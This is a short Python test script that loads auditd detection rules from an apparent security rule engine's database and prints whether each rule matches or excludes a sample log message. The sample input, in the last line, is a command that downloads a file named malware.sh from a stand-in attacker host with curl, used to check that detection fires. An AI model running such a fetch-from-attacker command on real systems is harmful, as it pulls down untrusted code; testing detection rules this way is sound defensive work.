import json
from app import models
from app.db import SessionLocal
from app.services.rule_engine import RuleEngine

db = SessionLocal()
engine = RuleEngine(db)

def test(msg):
    log = {
        "log_type": "auditd",
        "message": msg,
        "host": "test-host",
        "command_line": msg
    }
    
    rules = engine.db.query(models.DetectionRule).filter(
        models.DetectionRule.enabled == True,
        models.DetectionRule.rule_type == "server",
        models.DetectionRule.log_type_scope == "auditd"
    ).all()
    print(f"Rules found: {len(rules)}")
    
    for r in rules:
        print(f"Rule: {r.id} {r.name}")
        raw_logic = json.loads(r.logic_json)
        logic = engine.normalize_logic(raw_logic)
        print("Logic Match:", logic["match"])
        matched, reason, tokens, sev = engine._match_conditions(msg, logic["match"])
        print(f"Matched: {matched}, reason: {reason}")
        if matched:
            excluded, ex_reason = engine._exclude_conditions(msg, log, logic["exclude"])
            print(f"Excluded: {excluded}, ex_reason: {ex_reason}")

test("curl http://evil.com -o malware.sh")
